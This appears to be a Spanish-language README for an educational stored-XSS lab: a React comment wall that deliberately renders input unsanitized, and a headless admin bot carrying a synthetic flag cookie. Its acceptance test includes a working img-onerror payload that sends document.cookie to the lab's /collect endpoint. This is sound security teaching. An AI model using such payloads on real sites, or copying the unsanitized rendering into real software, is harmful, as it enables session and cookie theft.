# Lab XSS almacenado — Muro de comentarios (React + Express + bot admin)

Laboratorio **educativo** de seguridad web para un curso de equipo rojo. Reproduce un
**XSS almacenado** clásico (estilo PortSwigger Academy / DVWA / WebGoat): un muro de
comentarios que renderiza el texto **sin sanitizar** (`dangerouslySetInnerHTML`), y un
**bot admin** (Chromium headless, en el propio servidor) que lleva una flag **sintética**
en su cookie y visita el muro cada pocos segundos. Si un comentario contiene un payload,
este corre en la sesión del bot y manda la cookie al buzón del lab (`/collect`).

> **Marco ético.** Entorno autorizado y desechable del curso. La "víctima" es un **bot del
> propio laboratorio**, nunca una persona. Las flags son sintéticas (`FLAG{xss_stored_<sala>}`).
> No uses estas técnicas fuera de este laboratorio.

## Login y "salas" multi-alumno
Una sola instancia sirve a toda la clase. El alumno entra en `/` (pantalla de **login**),
escribe su nombre y la app lo redirige a **su sala** (`/board?room=<su-nombre>`). El nombre
se convierte en un identificador de sala (`Ana Pérez` → `ana-perez`). Los comentarios se
guardan por sala, el bot visita todas las salas con comentarios, y `/loot?room=<sala>`
muestra solo lo capturado en esa sala.

---

## Opción A — Correr en GitHub Codespaces con Docker (sin AWS)

Es la forma recomendada para **revisar y publicar desde el entorno de desarrollo de GitHub**.
El `.devcontainer` incluye **Docker-in-Docker**, Chromium y **cloudflared** (para exponer el
lab a Internet sin AWS).

1. En el repo: botón verde **Code → Codespaces → Create codespace**.
2. Al crear el codespace, el `.devcontainer` instala Chromium, cloudflared, `npm install` y `npm run build`.
3. En la terminal del codespace, levanta el lab con Docker:
   ```bash
   docker compose up -d --build     # backend + bot admin en el puerto 80
   ```
   (O sin Docker: `npm run lab`, que usa `PORT=3000`.)
4. Codespaces ofrece reenviar el **puerto 80**: ábrelo para ver el login. Para que la clase
   entre durante la sesión, en la pestaña **Ports** cambia la visibilidad del puerto a
   **Public** y comparte la URL.

### Exponer a Internet con cloudflared (alumnos fuera de la LAN, sin AWS)
Si prefieres una URL pública estable durante la clase sin depender del reenvío de Codespaces:
```bash
cloudflared tunnel --url http://localhost:80
```
Imprime una URL `https://<algo>.trycloudflare.com` que apunta a tu lab. Es un túnel
**temporal**; al cortar el proceso (Ctrl-C) la URL deja de existir. Úsalo solo mientras dure
la clase.

> **Nota sobre GitHub Pages:** no sirve para este lab. Pages solo publica archivos
> estáticos y aquí hace falta un servidor (Express) y el bot (Puppeteer). El puerto público
> de Codespaces o un túnel cloudflared cubren una sesión de clase sin coste de AWS.

## Opción B — Docker local

```bash
docker compose up -d --build
# el muro queda en http://localhost/board?room=test
```

## Opción C — AWS EC2

Solo si necesitas una IP pública estable y persistente. Ver la guía del docente
(`Montaje_Sitio_Rojo_AWS_Docker_React.md`): instancia Ubuntu `t3.small`, puerto 80 abierto,
`docker compose up -d --build`, y ajustar `BASE_URL` a `http://IP_PUBLICA` en el compose.

---

## Prueba de aceptación

Con el lab corriendo con Docker el puerto es `80` (con `npm run lab`, sería `3000`):

```bash
curl -s -X POST http://localhost/api/comments -H 'Content-Type: application/json' \
  -d '{"room":"test","text":"<img src=x onerror=\"fetch(`/collect?room=test&c=`+document.cookie)\">"}'
sleep 15   # espera a que el bot admin visite la sala
curl -s "http://localhost/loot?room=test"
#   -> debe aparecer una entrada con  flag=FLAG{xss_stored_test}
```

En la interfaz, el alumno hace esto desde la **guía paso a paso**: entra con su nombre,
pulsa "Insertar payload de ejemplo", "Publicar comentario", y la guía detecta sola cuándo
el bot capturó la flag.

## Rutas

| Ruta | Qué hace |
|------|----------|
| `GET /` | Login: el alumno escribe su nombre y entra a su sala. |
| `GET /board?room=NAME` | Muro de comentarios de la sala (la página React). |
| `POST /api/comments` | Guarda un comentario `{ room, text }` (sin sanitizar). |
| `GET /api/comments?room=NAME` | Lista los comentarios de la sala (JSON). |
| `GET /collect` | Buzón de exfiltración del lab; registra la query y responde un pixel. |
| `GET /loot?room=NAME` | Muestra lo capturado en `/collect` para esa sala. |

## Estructura

```
index.html          Entrada de Vite
src/App.jsx         Muro React (incluye la vulnerabilidad deliberada)
src/main.jsx        Bootstrap de React
src/styles.css      Estilos
server.js           Backend Express (API, /collect, /loot, sirve el front)
bot.js              Bot admin con Puppeteer (lleva la flag en su cookie)
Dockerfile          Imagen con Chromium para Puppeteer
docker-compose.yml  Levanta el lab en el puerto 80
.devcontainer/      Config de GitHub Codespaces (puerto 3000)
```

## Limpieza

```bash
docker compose down            # local
# en AWS, además: terminar la instancia EC2
```
